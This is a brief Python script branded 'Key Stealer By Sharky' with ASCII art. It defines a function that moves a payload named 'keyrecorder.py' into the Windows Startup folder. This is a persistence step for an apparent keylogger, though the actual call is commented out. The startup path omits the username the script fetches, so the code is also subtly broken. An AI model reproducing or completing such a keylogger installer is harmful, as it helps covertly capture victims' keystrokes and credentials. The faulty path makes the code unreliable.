import os
import shutil

# Printing art
print(r"""
               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO\
      ,;::::::;     ;'         / OOOOOOO\
    ;:::::::::`. ,,,;.        /  / DOOOOOO\
  .';:::::::::::::::::;,     /  /     DOOOO\
 ,::::::;::::::;;;;::::;,   /  /        DOOO\
;`::::::`'::::::;;;::::: ,|/  /          DOOO\
:`:::::::`;::::::;;::: ;::|  /            DOOO
::`:::::::`;:::::::: ;::::| /              DOO
`:`:::::::`;:::::: ;::::::|/               DOO
 :::`:::::::`;; ;:::::::::\|                OO
 ::::`:::::::`;::::::::;:::\                OO
 `:::::`::::::::::::;'`:;::|                O
  `:::::`::::::::;' /  / `:|
   ::::::`:::::;'  /  /   `|

 _   __             _____ _             _           
| | / /            /  ___| |           | |          
| |/ /  ___ _   _  \ `--.| |_ ___  __ _| | ___ _ __ 
|    \ / _ \ | | |  `--. \ __/ _ \/ _` | |/ _ \ '__|
| |\  \  __/ |_| | /\__/ / ||  __/ (_| | |  __/ |   
\_| \_/\___|\__, | \____/ \__\___|\__,_|_|\___|_|   
             __/ |                                  
            |___/           By Sharky          


-----------------------------------------------------
                   
""")
# Getting the username of logged in account
user = os.getlogin()

# Moving files from usb to shell:startup
def add_to_startup(file):
    shutil.move(f"{file}", "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    print("[*] Successfully moved files")

payload = "keyrecorder.py"
# add_to_startup(payload)

